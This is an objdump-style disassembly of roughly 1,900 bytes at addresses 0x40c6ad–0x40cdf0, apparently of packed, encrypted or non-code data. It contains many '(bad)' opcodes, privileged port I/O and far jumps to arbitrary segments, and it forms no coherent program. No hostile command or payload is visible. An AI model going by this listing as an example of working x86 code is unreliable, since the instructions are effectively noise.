  40c6ad:	sub    edx,DWORD PTR [edx]
  40c6af:	cmp    al,0xa2
  40c6b1:	inc    bx
  40c6b3:	in     eax,dx
  40c6b4:	out    0x8f,eax
  40c6b6:	and    DWORD PTR [esi-0x34],edi
  40c6b9:	mov    bh,0xa9
  40c6bb:	jg     0x40c6e2
  40c6bd:	stos   BYTE PTR es:[edi],al
  40c6be:	ja     0x40c6dc
  40c6c0:	cmc    
  40c6c1:	jmp    0x40c65f
  40c6c3:	cld    
  40c6c4:	fcomp  DWORD PTR [ebp+0x15068e9]
  40c6ca:	scas   al,BYTE PTR es:[edi]
  40c6cb:	sar    DWORD PTR [ebp+0x180d68f7],0xd7
  40c6d2:	mov    DWORD PTR [ecx-0x18d3822f],edi
  40c6d8:	mov    esp,DWORD PTR [ebx]
  40c6da:	dec    edx
  40c6db:	mov    ah,0x12
  40c6dd:	dec    ebx
  40c6de:	imul   edx,DWORD PTR [eax+eax*8-0x33],0x77c9f02
  40c6e6:	and    al,0x72
  40c6e8:	fs inc edx
  40c6ea:	mov    al,cl
  40c6ec:	rcl    DWORD PTR [ecx+0x4d49474b],1
  40c6f2:	addr16 add eax,0xfebb01c3
  40c6f8:	(bad)  
  40c6f9:	ss push ebx
  40c6fb:	or     eax,0x6331aaea
  40c700:	pop    esp
  40c701:	push   edx
  40c702:	add    eax,0x46dd5548
  40c707:	shl    DWORD PTR [edi+ebp*4-0x59],1
  40c70b:	cmp    DWORD PTR [eax],edx
  40c70d:	xchg   al,dh
  40c70f:	xrelease mov DWORD PTR [esi-0x7f],ecx
  40c713:	sti    
  40c714:	dec    edi
  40c715:	push   eax
  40c716:	dec    edx
  40c717:	stos   BYTE PTR es:[edi],al
  40c718:	cmp    DWORD PTR [edx+0x3b],ecx
  40c71b:	cmp    ah,al
  40c71d:	xor    eax,0x98d43dd6
  40c722:	jle    0x40c6b6
  40c724:	dec    edx
  40c726:	test   eax,0xd687beb5
  40c72b:	mov    ecx,cs
  40c72d:	(bad)  
  40c72e:	jnp    0x40c74f
  40c730:	iret   
  40c731:	sbb    esi,0x581bd8d2
  40c737:	cmc    
  40c738:	push   ss
  40c739:	dec    esi
  40c73a:	xlat   BYTE PTR ds:[ebx]
  40c73b:	dec    esp
  40c73c:	jp     0x40c783
  40c73e:	push   edx
  40c73f:	retf   
  40c740:	les    esp,FWORD PTR [eax+0x38]
  40c743:	sub    al,0x8
  40c745:	out    dx,al
  40c746:	lea    edi,ds:0xa155f0c0
  40c74c:	mov    ebp,DWORD PTR [edx-0x5151cc42]
  40c752:	xchg   edi,eax
  40c753:	adc    BYTE PTR [edi],ch
  40c755:	(bad)  
  40c756:	lock push esi
  40c758:	push   cs
  40c759:	xchg   ecx,eax
  40c75a:	nop
  40c75b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c75c:	push   eax
  40c75d:	retf   
  40c75e:	lock dec ebp
  40c760:	ret    
  40c761:	xor    BYTE PTR [eax+0x12],ch
  40c764:	mov    ecx,0x763de44d
  40c769:	pop    es
  40c76a:	movups xmm5,xmm5
  40c76d:	cmp    eax,0x7eadc4e4
  40c772:	aad    0xf8
  40c774:	pop    esp
  40c775:	mov    ch,0x7d
  40c777:	fdiv   DWORD PTR [edi+0xb]
  40c77b:	sbb    DWORD PTR [edi],eax
  40c77d:	mov    cl,0x84
  40c77f:	fucomp st(7)
  40c781:	jnp    0x40c729
  40c783:	sub    eax,0x35953ce9
  40c788:	push   es
  40c789:	fdivr  DWORD PTR [ebx+0x2f]
  40c78c:	aas    
  40c78d:	mov    bh,0x9c
  40c78f:	jne    0x40c761
  40c791:	push   0xffffffed
  40c793:	mov    cs,WORD PTR [ecx+0x48]
  40c796:	fnsave [ebp-0xf19a35e]
  40c79c:	in     al,dx
  40c79d:	ror    DWORD PTR [eax+edi*4+0x685bf91c],cl
  40c7a4:	xchg   ebp,eax
  40c7a5:	mov    eax,0xb3b53de0
  40c7aa:	jne    0x40c7aa
  40c7ac:	mov    ecx,0xc74158e0
  40c7b1:	push   esi
  40c7b2:	loopne 0x40c7c2
  40c7b4:	in     al,dx
  40c7b5:	pop    edx
  40c7b6:	fisttp WORD PTR [ebp-0x5446628e]
  40c7bc:	lea    esp,[ebx+0x39]
  40c7bf:	cmc    
  40c7c0:	adc    BYTE PTR [edx-0x7628218a],bl
  40c7c6:	dec    edx
  40c7c7:	mov    DWORD PTR [esi+0x3e099580],ebx
  40c7cd:	test   al,0x1f
  40c7cf:	mov    edx,0x8e783c3d
  40c7d4:	push   0xc4eab38c
  40c7d9:	adc    BYTE PTR [ebx-0x3d52b40a],cl
  40c7df:	fist   DWORD PTR gs:[ebp+0x6a7bbf2e]
  40c7e6:	sbb    ecx,DWORD PTR [esi+0x951da]
  40c7ec:	adc    al,0x5c
  40c7ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ef:	mov    dl,al
  40c7f1:	clc    
  40c7f2:	aaa    
  40c7f3:	ror    BYTE PTR [esp+ebx*8],0x43
  40c7f7:	sar    DWORD PTR [ebx],0x6b
  40c7fa:	mov    edi,0x5cb05231
  40c7ff:	ret    
  40c800:	xchg   esi,eax
  40c801:	into   
  40c802:	adc    bh,cl
  40c804:	cs push edi
  40c806:	test   al,0x97
  40c808:	ror    DWORD PTR [ebx-0x6f890723],1
  40c80e:	jno    0x40c7b0
  40c810:	ss fdivr st(3),st
  40c813:	ss pop es
  40c815:	outs   dx,DWORD PTR ds:[esi]
  40c816:	add    DWORD PTR [ebx-0x4f41bc82],eax
  40c81c:	mov    cl,0xb7
  40c81e:	push   edx
  40c81f:	pop    ebp
  40c820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c821:	pop    eax
  40c822:	call   0x2623:0x30da385d
  40c829:	xchg   ebx,eax
  40c82a:	push   cs
  40c82b:	add    al,0xd3
  40c82d:	adc    cl,BYTE PTR [ecx+ebx*1]
  40c830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c831:	rol    edi,1
  40c833:	push   0xf44bcebe
  40c838:	cmp    ebx,DWORD PTR [esi+0x559a45d7]
  40c83e:	cdq    
  40c83f:	sub    DWORD PTR [ebx-0x75852962],edx
  40c845:	rol    DWORD PTR [esi],1
  40c847:	dec    eax
  40c848:	jbe    0x40c7db
  40c84a:	imul   ebx,DWORD PTR [eax+0x5c],0xfffffff6
  40c84e:	nop
  40c84f:	fsubr  QWORD PTR [ebx+0xe]
  40c852:	and    ebp,eax
  40c854:	stc    
  40c855:	cmp    eax,0xf3f96639
  40c85a:	jge    0x40c80a
  40c85c:	out    0x5f,al
  40c85e:	or     BYTE PTR [ebx-0x39],bl
  40c861:	imul   edi,DWORD PTR [ebx],0xfffffff6
  40c864:	stc    
  40c865:	mov    eax,ds:0xe7d1c9b8
  40c86a:	nop
  40c86b:	jmp    0x50504f2d
  40c870:	jecxz  0x40c8a3
  40c872:	sbb    ch,cl
  40c874:	jp     0x40c7ff
  40c876:	enter  0xd746,0x8b
  40c87a:	fdiv   st,st(0)
  40c87c:	dec    esi
  40c87d:	call   0xedaa033d
  40c882:	shl    BYTE PTR [esi+ebp*2-0x5b11d5e0],0x78
  40c88a:	mov    ch,0xb3
  40c88c:	mov    WORD PTR [esi+edi*2],?
  40c88f:	nop
  40c890:	sbb    eax,0xd9468717
  40c895:	pop    edi
  40c896:	ins    DWORD PTR es:[edi],dx
  40c897:	push   edx
  40c898:	test   eax,0xc0d7e37f
  40c89d:	cmp    eax,0x87cb115f
  40c8a2:	aas    
  40c8a3:	mov    fs,WORD PTR [ecx]
  40c8a5:	dec    esp
  40c8a6:	mov    esp,0x9bf58079
  40c8ab:	inc    ecx
  40c8ac:	sub    esi,DWORD PTR [edi]
  40c8ae:	js     0x40c84e
  40c8b0:	dec    ebx
  40c8b1:	push   cs
  40c8b2:	mov    ah,0x4b
  40c8b4:	mov    ecx,0x4d5f8390
  40c8b9:	loopne 0x40c8f8
  40c8bb:	jae    0x40c8ba
  40c8bd:	bound  esp,QWORD PTR [esi+0x7a8d2052]
  40c8c3:	fcom   DWORD PTR [ebp-0x27]
  40c8c6:	push   edi
  40c8c7:	push   0x19
  40c8c9:	sbb    al,0xd7
  40c8cb:	ins    DWORD PTR es:[edi],dx
  40c8cc:	scas   al,BYTE PTR es:[edi]
  40c8cd:	mov    ds:0x77a962d7,al
  40c8d2:	out    dx,eax
  40c8d3:	mov    ecx,0x4eed490d
  40c8d8:	or     DWORD PTR gs:[edx],eax
  40c8db:	cli    
  40c8dc:	imul   dh
  40c8de:	stos   DWORD PTR es:[edi],eax
  40c8df:	jbe    0x40c863
  40c8e1:	xor    DWORD PTR [ecx+0x2f],edi
  40c8e4:	sti    
  40c8e5:	(bad)  
  40c8e6:	call   0x2eea:0x4d257787
  40c8ed:	test   BYTE PTR [ebx+0x2ddec271],ch
  40c8f3:	loopne 0x40c8b1
  40c8f5:	mov    ecx,0x76352340
  40c8fa:	jo     0x40c948
  40c8fc:	add    eax,0x538edd99
  40c901:	es (bad) 
  40c903:	lods   al,BYTE PTR ds:[esi]
  40c904:	retf   0xf964
  40c907:	dec    esi
  40c908:	out    dx,al
  40c909:	and    al,0xdb
  40c90b:	mov    ecx,0x9171d967
  40c910:	mov    ch,0xf0
  40c912:	aad    0xff
  40c914:	fsubr  st,st(6)
  40c916:	pop    esp
  40c917:	and    eax,0xc3a60032
  40c91c:	ja     0x40c931
  40c91e:	nop
  40c91f:	fsub   DWORD PTR [edi]
  40c921:	push   ss
  40c922:	jle    0x40c95b
  40c924:	mov    bh,0x32
  40c926:	xor    BYTE PTR [ebx-0x3e],0x8f
  40c92a:	jns    0x40c8f3
  40c92c:	mov    ds:0xa08aa70d,al
  40c931:	mov    esi,0xd386a818
  40c936:	repz or al,0x24
  40c939:	je     0x40c94d
  40c93b:	lock mov edi,0xe64fb90c
  40c941:	inc    eax
  40c943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c944:	xchg   ecx,eax
  40c945:	sbb    BYTE PTR [edx],dh
  40c947:	sub    bh,ah
  40c949:	sub    cl,al
  40c94b:	ror    BYTE PTR [ecx+0x58],1
  40c94e:	or     bl,BYTE PTR [edi+eax*1+0x40]
  40c952:	scas   al,BYTE PTR es:[edi]
  40c953:	in     eax,0xa4
  40c955:	fwait
  40c956:	push   eax
  40c957:	mov    ah,0x37
  40c959:	cmp    dl,BYTE PTR [edx+0x5de3d640]
  40c95f:	mov    edi,DWORD PTR [edx]
  40c961:	sbb    edi,DWORD PTR [edx+0x77]
  40c964:	mov    ecx,0x4943ee3f
  40c969:	add    al,0xaf
  40c96b:	xchg   edx,eax
  40c96c:	sbb    BYTE PTR [edi+0x794c223c],0xa
  40c973:	scas   eax,DWORD PTR es:[edi]
  40c974:	or     ebp,DWORD PTR [eax+0x614696cc]
  40c97a:	and    DWORD PTR [ebx+0x48],ecx
  40c97d:	mov    ah,0xf2
  40c97f:	lahf   
  40c980:	jno    0x40c927
  40c982:	jle    0x40c906
  40c984:	scas   eax,DWORD PTR es:[edi]
  40c985:	stos   BYTE PTR es:[edi],al
  40c986:	xchg   edx,eax
  40c987:	mov    eax,ds:0xb45b94fc
  40c98c:	test   eax,0xef3b0a76
  40c991:	and    al,0xae
  40c993:	int3   
  40c994:	in     eax,0x77
  40c996:	test   DWORD PTR [edx+0x79],edi
  40c999:	pop    edx
  40c99a:	dec    ebx
  40c99b:	xor    al,0xc7
  40c99d:	cwde   
  40c99e:	sbb    al,0x78
  40c9a0:	jno    0x40c936
  40c9a2:	pop    ss
  40c9a3:	js     0x40c942
  40c9a5:	sub    al,0x60
  40c9a7:	adc    bl,BYTE PTR [edi-0x6c]
  40c9aa:	std    
  40c9ab:	sub    al,0x9a
  40c9ad:	neg    DWORD PTR [ebx+0xe75dd12]
  40c9b3:	adc    eax,eax
  40c9b5:	and    eax,0xf5e4a495
  40c9ba:	in     al,0x28
  40c9bc:	sar    DWORD PTR [ebx+0x3593761e],cl
  40c9c2:	add    eax,0x38cc2a56
  40c9c7:	adc    al,0xc
  40c9c9:	scas   al,BYTE PTR es:[edi]
  40c9ca:	inc    esp
  40c9cb:	xor    eax,0x3daca5b7
  40c9d0:	(bad)  [edi]
  40c9d2:	add    al,BYTE PTR [eax+edx*8]
  40c9d5:	fwait
  40c9d6:	popa   
  40c9d7:	rol    DWORD PTR [ebp-0x6a],0xd3
  40c9db:	xor    esi,DWORD PTR [ebx-0x4a93c962]
  40c9e1:	ret    0xd765
  40c9e4:	es dec eax
  40c9e6:	fistp  QWORD PTR cs:[edi-0xc]
  40c9ea:	mov    eax,0x686b3889
  40c9ef:	ins    BYTE PTR es:[edi],dx
  40c9f0:	pusha  
  40c9f1:	cmp    al,0x8
  40c9f3:	mov    bl,BYTE PTR [edi+0x2fd8a7b]
  40c9f9:	cdq    
  40c9fa:	icebp  
  40c9fb:	mov    ah,0x95
  40c9fd:	pop    es
  40c9fe:	xchg   ebx,eax
  40c9ff:	or     al,0xa4
  40ca01:	scas   al,BYTE PTR es:[edi]
  40ca02:	lahf   
  40ca03:	cmp    eax,DWORD PTR [edi]
  40ca05:	jne    0x40ca46
  40ca07:	imul   ebp,DWORD PTR [eax-0x78],0xffffff8c
  40ca0b:	sti    
  40ca0c:	les    ebp,FWORD PTR [ebx+ecx*2-0x3068be09]
  40ca13:	(bad)  
  40ca14:	rol    edi,1
  40ca16:	fimul  WORD PTR [ebx]
  40ca18:	test   DWORD PTR [ecx+0x4d0f7f33],ebx
  40ca1e:	push   esi
  40ca1f:	in     al,0x6c
  40ca21:	shr    DWORD PTR [edx+0x67663eba],0xd3
  40ca28:	pop    ebx
  40ca29:	add    BYTE PTR [edi],0x33
  40ca2c:	dec    ebx
  40ca2d:	les    edx,FWORD PTR [ebx]
  40ca2f:	add    bh,cl
  40ca31:	jmp    0xa29e:0xf69dd8bf
  40ca38:	adc    al,BYTE PTR [esi-0x24ce4d71]
  40ca3e:	pop    edx
  40ca3f:	mov    ?,WORD PTR [eax+0x3f751af3]
  40ca45:	mov    edx,0x6801e6e
  40ca4a:	ficomp DWORD PTR [ecx+esi*2]
  40ca4d:	sub    dl,BYTE PTR [edi-0x36]
  40ca50:	(bad)  
  40ca51:	jns    0x40caba
  40ca53:	sub    al,0x67
  40ca55:	add    BYTE PTR [esi-0x5344d291],dl
  40ca5b:	sahf   
  40ca5c:	fcmove st,st(5)
  40ca5e:	dec    edx
  40ca5f:	pop    ds
  40ca60:	ss cmp ebp,edx
  40ca63:	jp     0x40ca0d
  40ca65:	sbb    al,0x71
  40ca67:	jg     0x40c9f7
  40ca69:	mov    esp,0x5ae9009c
  40ca6e:	mov    ds:0x3adecc,eax
  40ca73:	push   ecx
  40ca74:	das    
  40ca75:	dec    BYTE PTR [esi+0x71]
  40ca78:	inc    esi
  40ca79:	sub    bl,BYTE PTR [eax+0x6ab738bb]
  40ca7f:	jb     0x40ca0b
  40ca81:	scas   al,BYTE PTR es:[edi]
  40ca82:	adc    eax,0x37097d0a
  40ca87:	push   0xc171c933
  40ca8c:	add    ah,dh
  40ca8e:	xchg   ebx,eax
  40ca8f:	mov    edx,DWORD PTR [eax]
  40ca91:	cmp    al,0xcc
  40ca93:	ret    
  40ca94:	clc    
  40ca95:	js     0x40ca1d
  40ca97:	(bad)  
  40ca99:	xchg   ebp,eax
  40ca9a:	lods   al,BYTE PTR ds:[esi]
  40ca9b:	push   es
  40ca9c:	adc    DWORD PTR [ecx],ecx
  40ca9e:	(bad)  
  40ca9f:	xlat   BYTE PTR ds:[ebx]
  40caa0:	sub    esi,DWORD PTR [eax]
  40caa2:	adc    DWORD PTR ds:0x74b1a2f0,esp
  40caa8:	test   eax,0x53fba659
  40caad:	and    eax,0x38c583b1
  40cab2:	push   0x79
  40cab4:	push   ebx
  40cab5:	rcr    DWORD PTR [ebx-0x77],cl
  40cab8:	add    eax,0xc8be40be
  40cabd:	adc    esi,DWORD PTR [ebp+0x7fad3c6f]
  40cac3:	repz push es
  40cac5:	mov    dh,0x4e
  40cac7:	inc    eax
  40cac8:	clc    
  40cac9:	adc    al,0x2d
  40cacb:	pop    eax
  40cacc:	cmp    bl,BYTE PTR ds:0x68ef1003
  40cad2:	scas   al,BYTE PTR es:[edi]
  40cad3:	push   edx
  40cad4:	pop    edi
  40cad5:	fwait
  40cad6:	or     dl,0xdc
  40cad9:	(bad)  [edi+0x2fd15e47]
  40cadf:	mov    WORD PTR ds:0x750120c6,fs
  40cae5:	mov    eax,0x346de8bb
  40caea:	sbb    bl,dh
  40caec:	sub    al,0x69
  40caee:	popf   
  40caef:	fistp  QWORD PTR [esi*2-0x3c819f90]
  40caf6:	clc    
  40caf7:	mov    ch,0x7e
  40caf9:	mov    ecx,0xfd4faeaa
  40cafe:	mov    al,ds:0x8c6358d3
  40cb03:	jae    0x40cb08
  40cb05:	xlat   BYTE PTR ds:[ebx]
  40cb06:	and    DWORD PTR [edx-0x3d],esp
  40cb09:	mov    BYTE PTR [edx+edx*8-0x35],ah
  40cb0d:	pop    es
  40cb0e:	popf   
  40cb0f:	lods   eax,DWORD PTR ds:[esi]
  40cb10:	jns    0x40cae5
  40cb12:	loopne 0x40cb10
  40cb14:	cs jae 0x40cb3b
  40cb17:	test   DWORD PTR [ebx],ebp
  40cb19:	out    0x81,al
  40cb1b:	pop    ds
  40cb1c:	adc    al,al
  40cb1e:	aas    
  40cb1f:	pop    ecx
  40cb20:	inc    edx
  40cb21:	mov    dh,0xa3
  40cb23:	xchg   esp,eax
  40cb24:	jno    0x40cb4c
  40cb26:	cmp    DWORD PTR [ebx+0x1eeac873],esp
  40cb2c:	cmc    
  40cb2d:	jns    0x40caed
  40cb2f:	push   es
  40cb30:	jl     0x40cb69
  40cb32:	mov    ds:0xb37b4f5c,eax
  40cb37:	xor    DWORD PTR [ecx+ebp*8],0x5d5a7da0
  40cb3e:	retf   0xd268
  40cb41:	popf   
  40cb42:	xchg   edi,eax
  40cb43:	and    BYTE PTR [edi-0x46],ah
  40cb46:	push   ebx
  40cb47:	lods   eax,DWORD PTR ds:[esi]
  40cb48:	daa    
  40cb49:	mov    ds:0xace66447,eax
  40cb4e:	pop    ds
  40cb4f:	sbb    BYTE PTR [edi],cl
  40cb51:	jbe    0x40cb3e
  40cb53:	xchg   edx,eax
  40cb54:	xchg   ebx,eax
  40cb55:	xchg   esp,eax
  40cb56:	daa    
  40cb57:	cmp    BYTE PTR [edx],cl
  40cb59:	div    DWORD PTR ss:[ebx+esi*4-0x71]
  40cb5e:	push   ds
  40cb5f:	jg     0x40cb82
  40cb61:	jne    0x40caf2
  40cb63:	mov    ecx,0x60ebc997
  40cb68:	arpl   WORD PTR [eax-0x79f3d479],bx
  40cb6e:	fwait
  40cb6f:	jno    0x40cbb6
  40cb71:	mov    BYTE PTR [esi+0x38],bh
  40cb74:	mov    ah,0x95
  40cb76:	and    esp,DWORD PTR [eax-0x5decebd3]
  40cb7c:	sbb    eax,0xe27a9ff4
  40cb81:	fxch   st(6)
  40cb83:	mov    edx,DWORD PTR [edi-0x12]
  40cb86:	inc    eax
  40cb87:	mov    esi,0x61b02918
  40cb8c:	mov    dl,0x7b
  40cb8e:	aad    0x4d
  40cb90:	xor    ebp,DWORD PTR [ebx]
  40cb92:	int    0x75
  40cb94:	inc    esi
  40cb95:	icebp  
  40cb96:	in     al,0xf5
  40cb98:	jg     0x40cc0a
  40cb9a:	daa    
  40cb9b:	leave  
  40cb9c:	push   0xbeb8fa70
  40cba1:	and    DWORD PTR [ecx],ebx
  40cba3:	sub    edi,DWORD PTR [ecx]
  40cba5:	adc    al,0xcf
  40cba7:	mov    ebx,DWORD PTR [eax]
  40cba9:	add    dl,BYTE PTR [ecx-0x4dfb2e45]
  40cbaf:	lds    esp,FWORD PTR [esi+0x75]
  40cbb2:	iret   
  40cbb3:	or     ecx,esp
  40cbb5:	gs mov eax,0x467b323a
  40cbbb:	adc    eax,0x9bbee7d
  40cbc0:	dec    ecx
  40cbc1:	push   DWORD PTR [ebx]
  40cbc3:	xor    ebp,esp
  40cbc5:	hlt    
  40cbc6:	inc    eax
  40cbc7:	pop    ecx
  40cbc8:	test   BYTE PTR [eax+0x1f10bf70],dl
  40cbce:	call   0xce9b81b3
  40cbd3:	or     DWORD PTR [edx+0x3a],edx
  40cbd6:	push   esp
  40cbd7:	mov    edi,0x5bc7b685
  40cbdc:	xor    eax,0x3f1bf91
  40cbe1:	leave  
  40cbe2:	dec    edi
  40cbe3:	xchg   ecx,eax
  40cbe4:	fwait
  40cbe5:	out    dx,al
  40cbe6:	and    eax,0x779edc67
  40cbeb:	stos   DWORD PTR es:[edi],eax
  40cbec:	mov    edi,ecx
  40cbee:	mov    dh,0x74
  40cbf0:	and    DWORD PTR [ecx-0x3c754329],ebx
  40cbf6:	inc    esi
  40cbf7:	(bad)  [edx]
  40cbf9:	or     DWORD PTR [esi-0x73],ecx
  40cbfc:	inc    ebx
  40cbfd:	sub    edx,DWORD PTR ds:0x61a1328e
  40cc03:	cmp    eax,esi
  40cc05:	sbb    al,0x30
  40cc07:	lods   eax,DWORD PTR ds:[esi]
  40cc08:	das    
  40cc09:	daa    
  40cc0a:	xchg   esi,eax
  40cc0b:	jnp    0x40cc7d
  40cc0d:	gs jge 0x40cbce
  40cc10:	or     edx,DWORD PTR [ecx-0x29]
  40cc13:	adc    ebx,edx
  40cc15:	inc    ebp
  40cc16:	nop
  40cc17:	sbb    esi,esp
  40cc19:	push   ds
  40cc1a:	jg     0x40cbad
  40cc1c:	mov    eax,0x60c38c2c
  40cc21:	xor    eax,0x6bf328b2
  40cc26:	icebp  
  40cc27:	cmp    DWORD PTR ds:0xeebe28b6,ebx
  40cc2d:	xor    al,0x6a
  40cc2f:	adc    eax,0xf60ca74a
  40cc34:	and    BYTE PTR [eax],dl
  40cc36:	inc    eax
  40cc37:	in     eax,0xde
  40cc39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc3a:	(bad)  
  40cc3b:	shl    BYTE PTR [ebx+0x0],cl
  40cc3e:	mov    edx,0x2842f68c
  40cc43:	mov    BYTE PTR [edi-0x29],0x0
  40cc47:	xor    eax,0x880e146c
  40cc4c:	or     eax,0xc83ebafa
  40cc51:	and    ah,BYTE PTR [edx+0x3bde9787]
  40cc57:	gs dec eax
  40cc59:	xchg   edx,eax
  40cc5a:	lods   al,BYTE PTR ds:[esi]
  40cc5b:	ins    BYTE PTR es:[edi],dx
  40cc5c:	pusha  
  40cc5d:	(bad)  
  40cc5e:	sub    BYTE PTR ds:0x5f14ccf,ah
  40cc64:	ret    0x1bf0
  40cc67:	xor    ebx,esi
  40cc69:	dec    edx
  40cc6a:	lods   eax,DWORD PTR ds:[esi]
  40cc6b:	mov    dh,0x15
  40cc6d:	push   ebp
  40cc6e:	out    dx,al
  40cc6f:	fdiv   QWORD PTR [ecx+0x58bf48ae]
  40cc75:	mov    eax,ds:0x802a5392
  40cc7a:	mov    ebp,0xa5cd7cb9
  40cc7f:	fsub   QWORD PTR es:[eax]
  40cc82:	in     al,dx
  40cc83:	pop    ebx
  40cc84:	loop   0x40cc23
  40cc86:	inc    ebx
  40cc87:	sahf   
  40cc88:	sbb    al,0x34
  40cc8a:	inc    esp
  40cc8b:	sub    al,0x18
  40cc8d:	(bad)  
  40cc8e:	out    dx,al
  40cc8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc90:	dec    esp
  40cc91:	(bad)  
  40cc92:	int    0x50
  40cc94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc95:	push   edi
  40cc96:	xchg   esi,eax
  40cc97:	loope  0x40cc77
  40cc99:	mov    cl,0x53
  40cc9b:	aam    0x34
  40cc9d:	push   cs
  40cc9e:	fcomp  st(3)
  40cca0:	add    ah,BYTE PTR [ebp-0x1d1fc9e3]
  40cca6:	gs cli 
  40cca8:	lods   eax,DWORD PTR ds:[esi]
  40cca9:	jae    0x40cc95
  40ccab:	mov    ebp,0x8805d471
  40ccb0:	out    dx,eax
  40ccb1:	into   
  40ccb2:	rcl    BYTE PTR [ecx],1
  40ccb4:	and    DWORD PTR [edx],ebx
  40ccb6:	stos   DWORD PTR es:[edi],eax
  40ccb7:	mov    ebx,0xd04734e8
  40ccbc:	rcr    ebx,0xa6
  40ccbf:	mov    DWORD PTR ds:0x35a1e61f,ebx
  40ccc5:	(bad)  
  40ccc6:	not    DWORD PTR ds:0x885070aa
  40cccc:	pushf  
  40cccd:	leave  
  40ccce:	retf   0xbbad
  40ccd1:	fimul  WORD PTR [edi-0x43]
  40ccd4:	pop    edx
  40ccd5:	(bad)  
  40ccd6:	adc    eax,0x2daf2d0
  40ccdb:	fmul   st(1),st
  40ccdd:	jno    0x40cd21
  40ccdf:	and    al,0xf9
  40cce1:	std    
  40cce2:	xchg   BYTE PTR [ebx],ah
  40cce4:	es scas eax,DWORD PTR es:[edi]
  40cce6:	or     BYTE PTR [edx+0x17f10352],ch
  40ccec:	lods   al,BYTE PTR ds:[esi]
  40cced:	gs pop ds
  40ccef:	dec    edi
  40ccf0:	push   edx
  40ccf1:	sub    bl,ah
  40ccf3:	inc    esi
  40ccf4:	dec    esi
  40ccf5:	data16 jecxz 0x40cd5c
  40ccf8:	test   eax,0x183bdd87
  40ccfd:	pop    edi
  40ccfe:	rcl    DWORD PTR [ecx],1
  40cd00:	loop   0x40ccb4
  40cd02:	pop    ss
  40cd03:	ret    
  40cd04:	mov    cl,0x9c
  40cd06:	inc    eax
  40cd07:	retf   
  40cd08:	sbb    edx,edx
  40cd0a:	cdq    
  40cd0b:	ins    BYTE PTR es:[edi],dx
  40cd0c:	leave  
  40cd0d:	mov    DWORD PTR [ebx],ecx
  40cd0f:	inc    ebp
  40cd10:	pop    esp
  40cd11:	les    esp,FWORD PTR [eax]
  40cd13:	pop    ebp
  40cd14:	enter  0x6c12,0xf6
  40cd18:	cs (bad) 
  40cd1a:	leave  
  40cd1b:	jo     0x40ccf1
  40cd1d:	out    0x9c,al
  40cd1f:	pop    esp
  40cd20:	and    al,0x1b
  40cd22:	rcr    al,cl
  40cd24:	test   eax,0x69c57123
  40cd29:	pop    edi
  40cd2a:	inc    edx
  40cd2b:	les    esi,FWORD PTR [esi]
  40cd2d:	(bad)  
  40cd2e:	pop    ds
  40cd2f:	enter  0x882e,0xc5
  40cd33:	in     eax,0xc7
  40cd35:	shl    eax,cl
  40cd37:	dec    edx
  40cd38:	lods   eax,DWORD PTR ds:[esi]
  40cd39:	and    eax,0x85e742bf
  40cd3e:	xchg   ebp,eax
  40cd3f:	pop    es
  40cd40:	mov    ?,WORD PTR [ebx-0xc6da604]
  40cd46:	jg     0x40cd67
  40cd48:	pusha  
  40cd49:	retf   0x17b3
  40cd4c:	xlat   BYTE PTR ds:[ebx]
  40cd4d:	and    eax,0x80c66c71
  40cd52:	adc    ch,BYTE PTR [ebp+0x12]
  40cd55:	lods   eax,DWORD PTR ds:[esi]
  40cd56:	jmp    0x37c1cd4f
  40cd5b:	(bad)  
  40cd5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd5d:	in     eax,dx
  40cd5e:	adc    BYTE PTR [ebx],al
  40cd60:	pop    eax
  40cd61:	daa    
  40cd62:	xchg   esp,eax
  40cd63:	mov    bl,BYTE PTR [esi+0x6085984f]
  40cd69:	cdq    
  40cd6a:	mov    ecx,0x2870a7a6
  40cd6f:	mov    gs,WORD PTR [ecx+edi*4+0x1]
  40cd73:	hlt    
  40cd74:	aad    0xbb
  40cd76:	cmp    BYTE PTR [edi-0x6a],bl
  40cd79:	dec    ecx
  40cd7a:	(bad)
  40cd7d:	call   0x1b040776
  40cd82:	ins    BYTE PTR es:[edi],dx
  40cd83:	ins    DWORD PTR es:[edi],dx
  40cd84:	sub    ch,BYTE PTR [edi+0x9]
  40cd87:	pop    edx
  40cd88:	out    0xd5,al
  40cd8a:	pop    eax
  40cd8b:	push   ebp
  40cd8c:	ror    BYTE PTR [edi+edx*2+0x7301205b],cl
  40cd93:	add    DWORD PTR [esi],ecx
  40cd95:	aad    0x3c
  40cd97:	sbb    ah,BYTE PTR [esp+edi*8-0x56]
  40cd9b:	dec    ebp
  40cd9c:	jae    0x40cdaf
  40cd9e:	das    
  40cd9f:	cld    
  40cda0:	mov    edx,0xb0bb95ef
  40cda5:	fsub   st,st(0)
  40cda7:	dec    esp
  40cda8:	or     dl,BYTE PTR [ebx]
  40cdaa:	and    edi,DWORD PTR [eax]
  40cdac:	xor    al,0x90
  40cdae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdaf:	mov    eax,ds:0x789d9d77
  40cdb4:	dec    esp
  40cdb5:	xchg   edx,eax
  40cdb6:	stc    
  40cdb7:	push   edi
  40cdb8:	mov    es,WORD PTR [edi-0xb62e95a]
  40cdbe:	inc    esi
  40cdbf:	pop    ss
  40cdc0:	gs dec esi
  40cdc2:	stos   DWORD PTR es:[edi],eax
  40cdc3:	retf   0x122d
  40cdc6:	rcr    esp,1
  40cdc8:	dec    esi
  40cdc9:	cmp    eax,0xf3163369
  40cdce:	fnstcw WORD PTR [ebx-0x38]
  40cdd1:	push   0x54
  40cdd3:	sbb    eax,0xd201c381
  40cdd8:	mov    dh,0xa9
  40cdda:	mov    edi,ebp
  40cddc:	mov    ds:0x28e7f8e5,eax
  40cde1:	bound  ecx,QWORD PTR [ecx-0x11914dff]
  40cde7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cde8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40cdea:	dec    eax
  40cdeb:	push   edi
  40cdec:	jae    0x40ce59
  40cdee:	push   ds
  40cdef:	cli    
  40cdf0:	jnp    0x40cda0
